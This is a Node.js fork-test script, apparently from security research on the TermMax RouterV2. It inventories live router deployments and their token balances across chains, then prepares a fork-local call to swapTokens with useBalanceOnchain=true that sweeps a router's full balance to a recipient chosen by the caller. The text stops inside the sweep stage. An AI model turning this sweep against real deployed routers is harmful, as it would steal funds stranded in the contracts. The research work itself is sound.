#!/usr/bin/env node
"use strict";

// termmax-router-sweep-fork.js
// TermMax RouterV2 full-balance sweep: deployment-binding fork test (lane 3).
//
// Scope (read-only census + fork-local impersonated txs only):
//   (a) census every LIVE TermMaxRouterV2 deployment discoverable from the local
//       trees/artifacts (deployment registry + prior read-only capture artifacts):
//       address, paused(), owner(), native balance, ERC20 settlement-book balances,
//       residue classification. Honest INCOMPLETE_<reason> where enum/read is impossible.
//   (b) fork-side sweep test against the Ethereum deployment: deal a victim token
//       balance to the forked router (MEASURED_INTERVENTION), then from a fresh
//       non-owner EOA call swapTokens with useBalanceOnchain=true and assert the
//       full dealt balance is swept to the caller-chosen recipient with zero caller
//       funding, no non-caller funds moving. Deterministic caller-funded controls.
//   (c) pause-state gating: live pause state per deployment; paused rows fail-closed.
//   (d) verdict: a caller-reachable sweep of UNOWNED residue without caller funding is
//       the exploit-relevant differential; otherwise FAIL_CLOSED / NO_FINDING.
//
// Discipline (mirrors tools/twyne-wrapper-accounting-step2.js):
//   * every numeric row carries its pin block + hash
//   * unit-scale guard fires INCONCLUSIVE_UNIT_SCALE_MISMATCH instead of a raw number
//   * no signing, no real-key reads; anvil txs only from impersonated/funded EOAs on the fork
//   * nothing is ever forwarded upstream
//
// Endpoint material (URL / host / path) is NEVER printed, persisted, or logged.
// Anvil forks through an in-process loopback relay that owns the upstream, mirroring
// tools/twyne-wrapper-accounting-step2.js. The only endpoint watermark emitted anywhere
// is the path-only inventory name. `rpc_endpoints.txt` material stays process-only.
//
// ABI provenance: forge build of targets/termmax is dependency-blocked offline (see
// reports/critical-termmax-generations.md), so no compiled artifact is available.
// inspectorSource=default; abiSource=hand-derived from
// targets/termmax/contracts/v2/router/{ITermMaxRouterV2.sol,TermMaxRouterV2.sol} and
// targets/termmax/contracts/v1/router/ISwapAdapter.sol, anchored below.

const fs = require("node:fs");
const path = require("node:path");
const http = require("node:http");
const net = require("node:net");
const { spawn, spawnSync } = require("node:child_process");
const { Interface, AbiCoder, keccak256 } = require(path.join(__dirname, "node_modules", "ethers"));

const ROOT = path.resolve(__dirname, "..");
const OUTDIR = path.join(ROOT, "reports", "raw", "fast");
const OUTPUT = path.join(OUTDIR, "termmax-router-sweep-r1.json");
const REPORT = path.join(ROOT, "reports", "termmax-router-sweep-r1.md");
const INVENTORY = path.join(ROOT, "rpc_endpoints.txt");
const DEPLOYMENTS = path.join(ROOT, "targets", "termmax", "deployments");
const PRIOR_ARTIFACT = path.join(ROOT, "reports", "raw", "fast", "critical-termmax-v2-router-sweep-step2-capture-r2.json");
const ANVIL = "C:\\Users\\MiPC\\.foundry\\bin\\anvil.exe";

const CHAIN_ID = 1;
const ROUTER = "0x324596C1682a5675008f6e58F9C4E0A894b079c7"; // eth-mainnet routerV2 (local manifest)
const IMPL_HINT = "0xC98A609d29f0c0e4a66f6e6f1af422c1138d378C";
const ROUTER_SOURCE = "targets/termmax/contracts/v2/router/TermMaxRouterV2.sol";
const SOURCE_ANCHORS = [
  "function swapTokens(SwapPath[] memory paths)",
  "uint256 balanceOnChain = IERC20(path.units[0].tokenIn).balanceOf(address(this));",
  "IERC20(units[i].tokenIn).safeTransfer(recipient, inputAmt);",
  "if (units[i].adapter == address(0))",
];
const PIN_HINT = 26173469;

const EIP1967_IMPL_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
const ONE = 10n ** 18n;
const VICTIM_UNITS = 1000n; // 1000 whole victim-token units dealt to the forked router
const BYSTANDER_UNITS = 7n; // unrelated non-caller holder, must not move
const UNIT_SCALE_FRACTION = 4; // floor = 10^(decimals-4) -> 0.0001 token; below it -> unit-scale inconclusive
const DEAL_SLOT_SCAN = 48; // max ERC20 balanceOf mapping slots probed

const LIMIT_MS = 480000;
const MAX_INVENTORY = 24;

// Known live TermMaxRouterV2 addresses from the local deployment registry, paired with
// keyless public backing used ONLY for read-only per-chain census (never logged).
const MANIFEST_CHAINS = {
  "eth-mainnet": 1, "bnb-mainnet": 56, "xlayer-mainnet": 196, "b2-mainnet": 223,
  "base-mainnet": 8453, "arb-mainnet": 42161, "bera-mainnet": 80094,
  "hyperevm-mainnet": 999, "pharos-mainnet": 688688,
};
const PUBLIC_CHAIN_URLS = {
  56: "https://bsc.publicnode.com",
  8453: "https://base.publicnode.com",
  42161: "https://arbitrum-one.publicnode.com",
};
const VICTIM_TOKENS = [
  { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" },
  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
];

const fail = (code) => { const e = new Error(code); e.code = code; throw e; };
const quantity = (value) => "0x" + BigInt(value).toString(16);
const word = (value) => `0x${BigInt(value).toString(16).padStart(64, "0")}`;
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const num = (v) => Number(BigInt(v));
const deadline = Date.now() + LIMIT_MS;

const EOA = "0x" + keccak256(Buffer.from("termmax-router-sweep-fork-eoa", "utf8")).slice(26);
const RECIPIENT = "0x" + keccak256(Buffer.from("termmax-router-sweep-fork-recipient", "utf8")).slice(26);
const BYSTANDER = "0x" + keccak256(Buffer.from("termmax-router-sweep-fork-bystander", "utf8")).slice(26);
const DUMMY = "0x0000000000000000000000000000000000000001";

let anvil = null;
let requestId = 0;
let aborted = false;
let stage = "SETUP";
let preferred = null;
const failedBackings = new Set();
const live = [];

// Hand-derived ABI (see header). Struct field order per ITermMaxRouterV2.sol:10-20 and
// ISwapAdapter.sol:5-14.
const IFACE = {
  router: new Interface([
    "function swapTokens((uint256 inputAmount,address recipient,bool useBalanceOnchain,(address adapter,address tokenIn,address tokenOut,bytes swapData)[] units)[] paths) returns (uint256[])",
    "function paused() view returns (bool)",
    "function owner() view returns (address)",
  ]),
  erc20: new Interface([
    "function balanceOf(address) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)",
    "function approve(address spender, uint256 value) returns (bool)",
    "function transfer(address to, uint256 value) returns (bool)",
  ]),
  events: new Interface([
    "event Transfer(address indexed from, address indexed to, uint256 value)",
  ]),
  errors: new Interface([
    "error EnforcedPause()",
    "error ExpectedPause()",
    "error SwapPathsIsEmpty()",
    "error SwapUnitsIsEmpty()",
    "error SafeERC20FailedOperation(address token)",
    "error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed)",
    "error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed)",
    "error CallbackAddressNotMatch()",
    "error ReentrancyGuardReentrantCall()",
  ]),
};

const CODES = new Set([
  "ANVIL_MISSING", "ANVIL_CLEANUP_FAILED", "ANVIL_ARGUMENTS_INVALID", "ANVIL_START_FAILED",
  "FORK_BLOCK_MISMATCH", "FORK_BACKING_UNSUPPORTED", "FORK_BACKING_METHOD_MISSING", "FORK_BACKING_STATE_MISSING",
  "FORK_BACKING_BLOCK_FAILURE", "FORK_BACKING_CHAIN_ID_FAILURE", "FORK_BACKING_GAS_PRICE_FAILURE",
  "FORK_BACKING_TRANSACTION_FAILURE", "FORK_BACKING_PROOF_FAILURE", "FORK_BACKING_CODE_FAILURE",
  "FORK_BACKING_BALANCE_FAILURE", "FORK_BACKING_RATE_LIMITED",
  "INVENTORY_MISSING", "DEADLINE_EXCEEDED",
  "RPC_RESPONSE_TOO_LARGE", "UPSTREAM_UNAVAILABLE", "UPSTREAM_RPC_ERROR", "LOCAL_RPC_UNAVAILABLE", "LOCAL_RPC_ERROR",
]);

function budget(maxMs = 8500) {
  if (aborted || Date.now() >= deadline) fail("DEADLINE_EXCEEDED");
  return Math.max(1, Math.min(maxMs, deadline - Date.now()));
}

function parseInventory() {
  if (!fs.existsSync(INVENTORY)) fail("INVENTORY_MISSING");
  const rows = [];
  for (const line of fs.readFileSync(INVENTORY, "utf8").split(/\r?\n/)) {
    const match = line.match(/https?:\/\/[^\s'"<>\[\]]+/i);
    if (!match) continue;
    let parsed;
    try { parsed = new URL(match[0].replace(/[)\],;]+$/, "")); } catch (_) { continue; }
    if (parsed.protocol !== "https:" || parsed.username || parsed.password || parsed.search || parsed.hash) continue;
    if (parsed.pathname !== "/" && !/^\/(v3|api)?\/?$/.test(parsed.pathname)) continue;
    const metadata = line.replace(match[0], " ");
    if (/\b(?:origin|header|auth|bearer|x-api-key|key|token)\s*[:=]/i.test(metadata)) continue;
    if (/solana|sui|aptos|stellar|tron|helius|sepolia|hoodi|testnet/i.test(parsed.hostname)) continue;
    rows.push(parsed.href);
  }
  return [...new Set(rows)].slice(0, MAX_INVENTORY);
}

function candidatePool() {
  const archive = ["https://eth.blockscout.com/api/eth-rpc", "https://eth.drpc.org"];
  const fallback = ["https://gateway.tenderly.co/public/mainnet", "https://rpc.mevblocker.io", "https://ethereum.publicnode.com"];
  const pool = [
    ...archive.map((url) => ({ url, backingClass: "PUBLIC_KEYLESS_ARCHIVE" })),
    ...fallback.map((url) => ({ url, backingClass: "PUBLIC_KEYLESS_FALLBACK" })),
    ...parseInventory().map((url) => ({ url, backingClass: "PUBLIC_KEYLESS_INVENTORY" })),
  ];
  const seen = new Set();
  const ordered = [];
  for (const c of pool) {
    if (seen.has(c.url)) continue;
    seen.add(c.url);
    ordered.push(c);
  }
  if (preferred && seen.has(preferred)) {
    const idx = ordered.findIndex((c) => c.url === preferred);
    if (idx > 0) ordered.unshift(ordered.splice(idx, 1)[0]);
  }
  return ordered;
}

async function rpc(url, method, params, upstream = false) {
  let response;
  const bodyJson = JSON.stringify({ jsonrpc: "2.0", id: ++requestId, method, params });
  for (let attempt = 0; attempt < 3; attempt += 1) {
    response = await fetch(url, {
      method: "POST", headers: { "content-type": "application/json" }, body: bodyJson,
      signal: AbortSignal.timeout(budget(upstream ? 8500 : 30000)),
    });
    if (response.status !== 429 || attempt === 2) break;
    await response.arrayBuffer();
    await delay(400 * (attempt + 1));
  }
  if (!response.ok || Number(response.headers.get("content-length") || 0) > 8 * 1024 * 1024) fail(upstream ? "UPSTREAM_UNAVAILABLE" : "LOCAL_RPC_UNAVAILABLE");
  const bytes = await response.arrayBuffer();
  if (bytes.byteLength > 8 * 1024 * 1024) fail("RPC_RESPONSE_TOO_LARGE");
  const body = JSON.parse(Buffer.from(bytes).toString("utf8"));
  if (body?.error) {
    const error = new Error(upstream ? "UPSTREAM_RPC_ERROR" : "LOCAL_RPC_ERROR");
    error.reverted = /execution reverted|\brevert\b|VM Exception/i.test(String(body.error.message || ""));
    const data = typeof body.error.data === "string" ? body.error.data : body.error.data?.data;
    if (typeof data === "string" && /^0x[0-9a-f]+$/i.test(data)) error.revertData = data.toLowerCase();
    throw error;
  }
  if (!body || Array.isArray(body) || body.result === undefined) fail(upstream ? "UPSTREAM_RPC_ERROR" : "LOCAL_RPC_ERROR");
  return body.result;
}

async function qualify(url) {
  if (await rpc(url, "eth_chainId", [], true) !== "0x1") return null;
  const head = (await rpc(url, "eth_getBlockByNumber", ["finalized", false], true).catch(() => null))
    || (await rpc(url, "eth_getBlockByNumber", ["latest", false], true));
  if (!head || !/^0x[0-9a-f]{64}$/i.test(head.hash || "") || !/^0x[0-9a-f]+$/i.test(head.number || "")) return null;
  const headNumber = num(head.number);
  const pin = headNumber - 1;
  const pinBlock = await rpc(url, "eth_getBlockByNumber", [quantity(pin), false], true);
  if (!pinBlock || num(pinBlock.number) !== pin || !/^0x[0-9a-f]{64}$/i.test(pinBlock.hash || "")) return null;
  const code = await rpc(url, "eth_getCode", [ROUTER, quantity(pin)], true);
  if (typeof code !== "string" || code.length <= 2) return null;
  const pausedProbe = await rpc(url, "eth_call", [{ to: ROUTER, data: IFACE.router.encodeFunctionData("paused", []) }, quantity(pin)], true);
  if (typeof pausedProbe !== "string" || pausedProbe.length < 3) return null;
  return { pin, pinHash: pinBlock.hash, pinTimestamp: num(pinBlock.timestamp), headNumber };
}

function stopAnvil() {
  if (!anvil) return true;
  const child = anvil;
  anvil = null;
  if (child.exitCode !== null || !child.pid) return true;
  if (process.platform === "win32") spawnSync("taskkill", ["/PID", String(child.pid), "/T", "/F"], { stdio: "ignore", windowsHide: true, timeout: 4000 });
  else { try { child.kill("SIGKILL"); } catch (_) {} }
  try { process.kill(child.pid, 0); return false; } catch (_) { return true; }
}

async function startRelay(upstream) {
  const server = http.createServer(async (req, res) => {
    try {
      if (req.method !== "POST" || req.socket.remoteAddress !== "127.0.0.1") fail("RELAY_INVALID_REQUEST");
      let size = 0; const chunks = [];
      for await (const chunk of req) { size += chunk.length; if (size > 1024 * 1024) fail("RELAY_REQUEST_TOO_LARGE"); chunks.push(chunk); }
      const query = JSON.parse(Buffer.concat(chunks).toString("utf8"));
      if (!query || typeof query.method !== "string" || !/^eth_|^net_|^web3_/.test(query.method)) fail("RELAY_INVALID_METHOD");
      let remote;
      for (let attempt = 0; attempt < 3; attempt += 1) {
        remote = await fetch(upstream, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(query), signal: AbortSignal.timeout(budget(25000)) });
        if (remote.status !== 429 || attempt === 2) break;
        await remote.arrayBuffer();
        await delay(400 * (attempt + 1));
      }
      const bytes = await remote.arrayBuffer();
      if (!remote.ok || bytes.byteLength > 16 * 1024 * 1024) fail("RELAY_UPSTREAM_FAILURE");
      res.writeHead(200, { "content-type": "application/json" }); res.end(Buffer.from(bytes));
    } catch (_) {
      if (!res.headersSent) res.writeHead(502, { "content-type": "application/json" });
      res.end(JSON.stringify({ jsonrpc: "2.0", id: null, error: { code: -32000, message: "RELAY_UPSTREAM_FAILURE" } }));
    }
  });
  await new Promise((resolve, reject) => { server.once("error", reject); server.listen(0, "127.0.0.1", resolve); });
  return { url: `http://127.0.0.1:${server.address().port}`, close() { try { server.closeAllConnections(); } catch (_) {} server.close(); } };
}

async function startAnvil(relayUrl, pin) {
  if (!stopAnvil()) fail("ANVIL_CLEANUP_FAILED");
  const listener = net.createServer();
  await new Promise((resolve, reject) => { listener.once("error", reject); listener.listen(0, "127.0.0.1", resolve); });
  const port = listener.address().port;
  await new Promise((resolve) => listener.close(resolve));
  anvil = spawn(ANVIL, ["--host", "127.0.0.1", "--port", String(port), "--fork-url", relayUrl,
    "--fork-block-number", String(pin), "--no-rate-limit", "--block-base-fee-per-gas", "1000000000"],
  { stdio: ["ignore", "ignore", "pipe"], windowsHide: true, shell: false });
  let bootDiagnostic = "";
  anvil.stderr.on("data", (chunk) => { bootDiagnostic = (bootDiagnostic + chunk.toString("utf8")).slice(-16384); });
  const bootError = () => {
    if (/429|too many requests|rate.limit/i.test(bootDiagnostic)) return "FORK_BACKING_RATE_LIMITED";
    if (/method not found/i.test(bootDiagnostic)) return "FORK_BACKING_METHOD_MISSING";
    if (/missing trie node|historical state/i.test(bootDiagnostic)) return "FORK_BACKING_STATE_MISSING";
    if (/failed to get.*(?:chain.?id|chain id)/i.test(bootDiagnostic)) return "FORK_BACKING_CHAIN_ID_FAILURE";
    if (/failed to get.*(?:gas price|gasprice)/i.test(bootDiagnostic)) return "FORK_BACKING_GAS_PRICE_FAILURE";
    if (/failed to get.*(?:transaction|receipt)/i.test(bootDiagnostic)) return "FORK_BACKING_TRANSACTION_FAILURE";
    if (/failed to get.*proof/i.test(bootDiagnostic)) return "FORK_BACKING_PROOF_FAILURE";
    if (/failed to get.*code/i.test(bootDiagnostic)) return "FORK_BACKING_CODE_FAILURE";
    if (/failed to get.*balance/i.test(bootDiagnostic)) return "FORK_BACKING_BALANCE_FAILURE";
    if (/failed to get block/i.test(bootDiagnostic)) return "FORK_BACKING_BLOCK_FAILURE";
    if (/failed to get|failed to fetch|cannot fork|unsupported/i.test(bootDiagnostic)) return "FORK_BACKING_UNSUPPORTED";
    if (/unexpected argument|unrecognized option|invalid value/i.test(bootDiagnostic)) return "ANVIL_ARGUMENTS_INVALID";
    return "ANVIL_START_FAILED";
  };
  anvil.on("error", () => { /* observed by readiness loop */ });
  for (let attempt = 0; attempt < 80; attempt += 1) {
    budget();
    if (anvil.exitCode !== null) fail(bootError());
    const local = `http://127.0.0.1:${port}`;
    try { if (await rpc(local, "eth_chainId", []) === "0x1" && num(await rpc(local, "eth_blockNumber", [])) === pin) return local; } catch (_) { /* boot in progress */ }
    await delay(120);
  }
  fail(bootError());
}

async function forkSession(name, fn) {
  const pool = candidatePool();
  let lastErr = "NO_ARCHIVE_BACKING";
  for (const cand of pool) {
    if (failedBackings.has(cand.url)) continue;
    budget(20000);
    let backing;
    try { backing = await qualify(cand.url); } catch (_) { failedBackings.add(cand.url); continue; }
    if (!backing) { failedBackings.add(cand.url); continue; }
    let relay = null;
    try {
      relay = await startRelay(cand.url);
      const local = await startAnvil(relay.url, backing.pin);
      const out = await fn(local, backing);
      preferred = cand.url;
      out.fork = { pin: backing.pin, pinHash: backing.pinHash, pinTimestamp: backing.pinTimestamp, headBlock: backing.headNumber, backingClass: cand.backingClass, freshFork: true };
      return out;
    } catch (e) {
      lastErr = e?.code && CODES.has(e.code) ? e.code : (e?.message || "FORK_STAGE_FAILURE");
      if (process.env.TERMMAX_SWEEP_DEBUG === "1") process.stderr.write(`[debug] fork ${name} backing failed: ${lastErr}\n`);
      if (lastErr === "DEADLINE_EXCEEDED") throw e;
      failedBackings.add(cand.url);
    } finally {
      stopAnvil();
      if (relay) relay.close();
    }
  }
  fail(lastErr);
}

// ---------------------------------------------------------------------------
// call helpers
// ---------------------------------------------------------------------------
async function tryCall(url, to, data, block) {
  try {
    const result = await rpc(url, "eth_call", [{ to, data }, block]);
    return { ok: true, result };
  } catch (e) {
    return { ok: false, reverted: e.reverted === true, revertData: e.revertData || null };
  }
}

async function view(url, to, fn, args, block = "latest", iface = IFACE.erc20) {
  const r = await tryCall(url, to, iface.encodeFunctionData(fn, args), block);
  if (!r.ok) return { ok: false, reverted: r.reverted, revertData: r.revertData };
  try { return { ok: true, value: iface.decodeFunctionResult(fn, r.result)[0] }; }
  catch (_) { return { ok: false, decodeFailed: true }; }
}

function decodeRevert(data) {
  if (!data) return { kind: "unknown", selector: null, message: "reverted-without-data" };
  const sel = data.slice(0, 10).toLowerCase();
  if (sel === "0x08c379a0") {
    try { const [m] = AbiCoder.defaultAbiCoder().decode(["string"], "0x" + data.slice(10)); return { kind: "Error(string)", selector: sel, message: String(m) }; } catch (_) { /* fallthrough */ }
  }
  if (sel === "0x4e487b71") {
    try { const [c] = AbiCoder.defaultAbiCoder().decode(["uint256"], "0x" + data.slice(10)); return { kind: "Panic(uint256)", selector: sel, message: "Panic(0x" + c.toString(16) + ")" }; } catch (_) { /* fallthrough */ }
  }
  try {
    const e = IFACE.errors.parseError(data);
    if (e) return { kind: "custom-error", selector: sel, message: e.name, args: (e.args || []).map((a) => String(a)) };
  } catch (_) { /* fallthrough */ }
  return { kind: "unknown-selector", selector: sel, message: "unrecognized-selector" };
}

async function sendTx(local, tx) {
  const hash = await rpc(local, "eth_sendTransaction", [tx]);
  let receipt = null;
  for (let n = 0; n < 60 && !receipt; n += 1) { receipt = await rpc(local, "eth_getTransactionReceipt", [hash]); if (!receipt) await delay(120); }
  return { hash, receipt };
}

function decodeTransferEvents(receipt, token) {
  const out = [];
  for (const log of receipt.logs || []) {
    if (token && String(log.address).toLowerCase() !== token.toLowerCase()) continue;
    try {
      const parsed = IFACE.events.parseLog(log);
      if (parsed && parsed.name === "Transfer") out.push({ from: parsed.args[0], to: parsed.args[1], value: parsed.args[2].toString() });
    } catch (_) { /* not our event */ }
  }
  return out;
}

async function readUint(local, addr, fn, args = []) {
  const r = await view(local, addr, fn, args);
  return r.ok ? BigInt(r.value) : null;
}

async function readBool(local, addr, fn) {
  const r = await view(local, addr, fn, [], "latest", IFACE.router);
  return r.ok ? Boolean(r.value) : null;
}

// ---------------------------------------------------------------------------
// census
// ---------------------------------------------------------------------------
function enumerateManifestRouters() {
  const rows = [];
  let dirs = [];
  try { dirs = fs.readdirSync(DEPLOYMENTS, { withFileTypes: true }).filter((e) => e.isDirectory()).map((e) => e.name); }
  catch (_) { return rows; }
  for (const dir of dirs) {
    const chainId = MANIFEST_CHAINS[dir];
    if (!chainId) continue;
    const file = path.join(DEPLOYMENTS, dir, `${dir}-core-v2.json`);
    if (!fs.existsSync(file)) continue;
    let json;
    try { json = JSON.parse(fs.readFileSync(file, "utf8")); } catch (_) { continue; }
    const router = json?.contracts?.routerV2;
    if (typeof router !== "string" || !/^0x[0-9a-fA-F]{40}$/.test(router) || /^0x0+$/.test(router)) continue;
    rows.push({
      network: dir, chainId, router: router.toLowerCase(),
      factoryV2: String(json?.contracts?.factoryV2 || "").toLowerCase() || null,
      oracleAggregatorV2: String(json?.contracts?.oracleAggregatorV2 || "").toLowerCase() || null,
      manifest: `targets/termmax/deployments/${dir}/${dir}-core-v2.json`,
      manifestSourceCommit: typeof json.gitCommitHash === "string" ? json.gitCommitHash.toLowerCase() : null,
      deploymentBlock: json?.blockInfo?.number != null ? String(json.blockInfo.number) : null,
    });
  }
  return rows;
}

function loadPriorArtifact() {
  const byChain = new Map();
  let meta = null;
  try {
    if (!fs.existsSync(PRIOR_ARTIFACT)) return { byChain, meta: { available: false, reason: "PRIOR_ARTIFACT_MISSING" } };
    const json = JSON.parse(fs.readFileSync(PRIOR_ARTIFACT, "utf8"));
    meta = { available: true, schema: json.schema || null, path: path.relative(ROOT, PRIOR_ARTIFACT).replaceAll("\\", "/") };
    for (const c of json.chains || []) {
      if (!c || c.chainId == null) continue;
      byChain.set(Number(c.chainId), {
        pin: c.pin?.number ? String(c.pin.number) : null,
        pinHash: c.pin?.hash || null,
        paused: c.pause?.paused ?? null,
        owner: c.pause?.owner || null,
        nativeBalance: c.nativeBalance != null ? String(c.nativeBalance) : null,
        implementation: c.runtime?.implementation || null,
        stateFamilyAgreement: c.runtime?.stateFamilyAgreement ?? null,
        nonzeroBalances: (c.nonzeroBalances || []).map((x) => ({ token: x.token, symbol: x.symbol, decimals: x.decimals, balance: String(x.balance) })),
        tokenRows: (c.tokenRows || []).map((x) => ({ token: x.token, symbol: x.symbol, decimals: x.decimals })),
      });
    }
  } catch (_) { meta = { available: false, reason: "PRIOR_ARTIFACT_UNREADABLE" }; }
  return { byChain, meta };
}

function settlementBookTokens(prior, chainId) {
  const rows = prior.byChain.get(chainId)?.tokenRows || [];
  const set = new Map();
  for (const t of rows) if (t.token) set.set(String(t.token).toLowerCase(), { token: String(t.token).toLowerCase(), symbol: t.symbol || null, decimals: t.decimals ?? null });
  for (const v of VICTIM_TOKENS) if (!set.has(v.address.toLowerCase())) set.set(v.address.toLowerCase(), { token: v.address.toLowerCase(), symbol: v.symbol, decimals: null });
  return [...set.values()];
}

// Fresh read-only census of a non-fork chain via keyless public backing.
async function directChainCensus(url, chainId, manifestRows) {
  const out = { chainId, freshness: null, rows: [], status: "OK" };
  try {
    const cid = await rpc(url, "eth_chainId", [], true);
    if (BigInt(cid) !== BigInt(chainId)) { out.status = "CHAIN_ID_MISMATCH"; return out; }
  } catch (_) { out.status = "UPSTREAM_UNREACHABLE"; return out; }
  let head;
  try { head = (await rpc(url, "eth_getBlockByNumber", ["finalized", false], true)) || (await rpc(url, "eth_getBlockByNumber", ["latest", false], true)); }
  catch (_) { out.status = "BLOCK_UNAVAILABLE"; return out; }
  if (!head || !/^0x[0-9a-f]{64}$/i.test(head.hash || "")) { out.status = "BLOCK_UNAVAILABLE"; return out; }
  const pin = num(head.number) - 1;
  let pinBlock = null;
  try { pinBlock = await rpc(url, "eth_getBlockByNumber", [quantity(pin), false], true); } catch (_) { /* optional */ }
  out.freshness = { pin, pinHash: pinBlock && /^0x[0-9a-f]{64}$/i.test(pinBlock.hash || "") ? pinBlock.hash : head.hash };
  const pinTag = quantity(pin);
  for (const m of manifestRows) {
    const row = { network: m.network, chainId, router: m.router, source: "fresh-keyless-read", pin: out.freshness.pin, pinHash: out.freshness.pinHash };
    try {
      const code = await rpc(url, "eth_getCode", [m.router, pinTag], true);
      row.codePresent = typeof code === "string" && code.length > 2;
      if (!row.codePresent) { row.state = "INCOMPLETE_NO_CODE_AT_PIN"; out.rows.push(row); continue; }
      const pause = await view(url, m.router, "paused", [], pinTag, IFACE.router);
      row.paused = pause.ok ? Boolean(pause.value) : null;
      const own = await view(url, m.router, "owner", [], pinTag, IFACE.router);
      row.owner = own.ok ? String(own.value).toLowerCase() : null;
      const nat = await rpc(url, "eth_getBalance", [m.router, pinTag], true);
      row.nativeBalance = String(BigInt(nat));
      const slot = await rpc(url, "eth_getStorageAt", [m.router, EIP1967_IMPL_SLOT, pinTag], true);
      row.implementation = typeof slot === "string" && /^0x[0-9a-f]{64}$/i.test(slot) ? "0x" + slot.slice(-40).toLowerCase() : null;
      row.state = row.paused == null ? "INCOMPLETE_PAUSE_UNREADABLE" : "LIVE_READ";
      row.erc20Balances = "INCOMPLETE_NOT_FORKED_THIS_CHAIN";
    } catch (e) {
      row.state = "INCOMPLETE_READ_FAILURE";
      row.error = e?.code && CODES.has(e.code) ? e.code : "READ_FAILURE";
    }
    out.rows.push(row);
  }
  return out;
}

// Fresh census of the fork chain (Ethereum) + settlement-book ERC20 balances.
async function censusOnFork(local, backing, bookTokens) {
  const rows = [];
  const routerCode = await rpc(local, "eth_getCode", [ROUTER, "latest"]);
  const paused = await readBool(local, ROUTER, "paused");
  const owner = await view(local, ROUTER, "owner", [], "latest", IFACE.router);
  const slot = await rpc(local, "eth_getStorageAt", [ROUTER, EIP1967_IMPL_SLOT, "latest"]);
  const native = BigInt(await rpc(local, "eth_getBalance", [ROUTER, "latest"]));
  const ethRow = {
    network: "eth-mainnet", chainId: CHAIN_ID, router: ROUTER.toLowerCase(),
    source: "fresh-fork-read", pin: backing.pin, pinHash: backing.pinHash,
    codePresent: typeof routerCode === "string" && routerCode.length > 2,
    paused: paused == null ? null : paused,
    owner: owner.ok ? String(owner.value).toLowerCase() : null,
    nativeBalance: native.toString(),
    implementation: /^0x[0-9a-f]{64}$/i.test(slot) ? "0x" + slot.slice(-40).toLowerCase() : null,
    implementationMatchesImplHint: /^0x[0-9a-f]{64}$/i.test(slot) ? ("0x" + slot.slice(-40).toLowerCase()) === IMPL_HINT.toLowerCase() : false,
    erc20Balances: [],
    residueClassification: null,
    state: paused == null ? "INCOMPLETE_PAUSE_UNREADABLE" : "LIVE_READ",
  };
  for (const t of bookTokens) {
    const decR = await view(local, t.token, "decimals", []);
    const balR = await view(local, t.token, "balanceOf", [ROUTER]);
    const symR = await view(local, t.token, "symbol", []);
    const decimals = decR.ok ? Number(decR.value) : (t.decimals ?? null);
    const b = {
      token: t.token, symbol: symR.ok ? String(symR.value) : (t.symbol || null),
      decimals, balance: balR.ok ? BigInt(balR.value).toString() : null,
      readOk: balR.ok, source: "settlement-book",
    };
    b.nonzero = b.readOk && BigInt(b.balance) > 0n;
    rows.push(b);
    ethRow.erc20Balances.push({ token: b.token, symbol: b.symbol, decimals: b.decimals, balance: b.balance, readOk: b.readOk, nonzero: b.nonzero });
  }
  const readFailures = ethRow.erc20Balances.filter((x) => !x.readOk).length;
  const nonzero = ethRow.erc20Balances.filter((x) => x.nonzero);
  ethRow.residueClassification = {
    tokenRowsRead: ethRow.erc20Balances.length,
    tokenRowsUnreadable: readFailures,
    nonzeroTokenCount: nonzero.length,
    nonzero: nonzero.map((x) => ({ token: x.token, symbol: x.symbol, decimals: x.decimals, balance: x.balance })),
    dustOnly: nonzero.length > 0 && nonzero.every((x) => dustOnly(x.balance, x.decimals)),
    note: "dustOnly uses a 10^(decimals-6) whole-token dust threshold; balances are raw-weathered and may include floated deal dust",
  };
  const verdict = paused === true ? "Fail-closed__paused"
    : readFailures > 0 && nonzero.length === 0 ? "INCOMPLETE_ERC20_READ_COVERAGE"
    : "PASS";
  return { verdict, ethRow, settlementBook: rows.length, readFailures };
}

function dustOnly(balance, decimals) {
  if (balance == null || decimals == null || decimals < 6) return false;
  const floor = 10n ** BigInt(decimals - 6); // 1e-6 whole token
  return BigInt(balance) <= floor;
}

// ---------------------------------------------------------------------------
// sweep stage
// ---------------------------------------------------------------------------
async function dealToken(local, token, holder, amount) {
  // Only mapping-derived keys (keccak(holder, slot)) are written; unrelated storage
  // is never touched. Records the exact slot used as a MEASURED_INTERVENTION.
  for (let slot = 0; slot < DEAL_SLOT_SCAN; slot += 1) {
    const key = keccak256(AbiCoder.defaultAbiCoder().encode(["address", "uint256"], [holder, slot]));
    await rpc(local, "anvil_setStorageAt", [token, key, word(amount)]);
    const bal = await readUint(local, token, "balanceOf", [holder]);
    if (bal !== null && bal >= amount) return { ok: true, method: `anvil_setStorageAt:keccak(holder,${slot})`, slot };
  }
  return { ok: false, method: null, slot: null };
}

function sweepPath(recipient, tokenIn, useBalanceOnchain, inputAmount) {
  return [{
    inputAmount: BigInt(inputAmount), recipient,
    useBalanceOnchain: Boolean(useBalanceOnchain),
    units: [{ adapter: "0x0000000000000000000000000000000000000000", tokenIn, tokenOut: DUMMY, swapData: "0x" }],
  }];
}

async function sweepStage(local, backing, bookTokens) {
  const out = {
    verdict: "INSUFFICIENT_EVIDENCE", pin: backing.pin, pinHash: backing.pinHash,
    eoa: EOA, recipient: RECIPIENT, bystander: BYSTANDER,
    paused: null, implementation: null, tokens: [], interventions: [], failures: [],
    exploitRelevantDifferential: false, callerFundingZero: true, noFindingSentence: null,
  };
  const paused = await readBool(local, ROUTER, "paused");
  out.paused = paused;
  const slot = await rpc(local, "eth_getStorageAt", [ROUTER, EIP1967_IMPL_SLOT, "latest"]);
  out.implementation = /^0x[0-9a-f]{64}$/i.test(slot) ? "0x" + slot.slice(-40).toLowerCase() : null;
  if (paused === true) {
    out.verdict = "Fail-closed__paused";
    out.noFindingSentence = "no-finding: the Ethereum TermMaxRouterV2 is paused at the pin, so the whenNotPaused swapTokens sweep is not caller-reachable.";
    return out;
  }
  if (paused == null) {
